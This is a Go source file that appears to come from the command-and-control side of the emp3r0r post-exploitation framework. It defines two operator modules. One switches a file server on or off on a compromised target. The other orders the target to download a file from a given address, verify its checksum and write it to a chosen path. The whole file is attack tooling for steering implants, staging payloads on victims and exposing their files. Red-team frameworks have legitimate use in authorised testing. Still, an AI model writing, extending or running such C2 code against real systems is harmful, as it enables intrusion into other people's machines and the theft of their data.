//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func moduleFileServer() {
	switchOpt, ok := CurrentModuleOptions["switch"]
	if !ok {
		CliPrintError("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := CurrentModuleOptions["port"]
	if !ok {
		CliPrintError("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrintInfo("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := CurrentModuleOptions[opt]; !ok {
			CliPrintError("Option '%s' not found", opt)
			return
		}
	}

	download_addr := CurrentModuleOptions["download_addr"].Val
	checksum := CurrentModuleOptions["checksum"].Val
	path := CurrentModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
}
